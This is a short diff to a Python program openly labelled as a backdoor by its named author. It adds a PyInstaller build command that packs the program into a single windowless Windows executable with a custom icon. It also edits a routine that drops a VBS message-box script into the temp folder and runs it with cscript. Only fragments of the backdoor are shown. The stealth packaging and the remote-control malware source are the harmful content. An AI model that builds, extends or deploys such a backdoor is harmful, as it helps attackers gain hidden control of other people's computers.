@@ -1,6 +1,6 @@
 # ============================================================
 # Backdoor developed by: Matheus Fontanetti Martins
-# Compilling to exe: 
+# Compilling to exe: pyinstaller.exe backdoor.py --onefile --windowed --icon=icon.ico
 # ============================================================
 
 import socket
@@ -130,7 +130,7 @@ class backdoor:
 		try:
 			str_script = os.path.join(self.TMP, "m.vbs")
             		with open(str_script, "w") as objVBS:
-                		objVBS.write('Msgbox "' + message + '", vbOKOnly+vbInformation+vbSystemModal, "Message"')
+                		objVBS.write('Msgbox "' + message + '", vbOKOnly+vbInformation+vbSystemModal, "Message"'.decode('utf-8'))
             		
 			command = "cscript " + self.TMP + "/m.vbs "
 			
